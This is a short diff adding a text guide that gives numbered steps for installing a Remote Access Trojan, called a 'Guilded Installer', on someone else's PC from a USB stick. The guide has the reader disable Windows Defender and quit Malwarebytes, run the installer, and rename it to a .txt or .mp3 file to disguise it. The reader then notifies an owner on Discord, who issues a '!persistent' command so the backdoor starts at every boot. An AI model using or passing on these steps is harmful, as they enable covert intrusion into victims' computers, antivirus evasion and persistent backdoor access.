@@ -1,0 +1,11 @@
+This is a step by step guide on how to download the RAT (Remote Access Trojan) onto someones PC.
+
+REQUIREMENTS:
+   "Guilded Installer" uploaded to a USB
+   
+1. Turn off Windows Defender and Quit Malrybytes if it is there
+2. Upload and Copy n' Paste the Installer.
+3. Run the installer on the Desktop
+4. Once it is finished turn it into a different file (.txt .mp3 .m4a)
+5. Contact the Owner on the discord server that you have done these steps
+6.  The owner will run the command "!persistent" so when the PC is turned on the Backdoor will turn on too
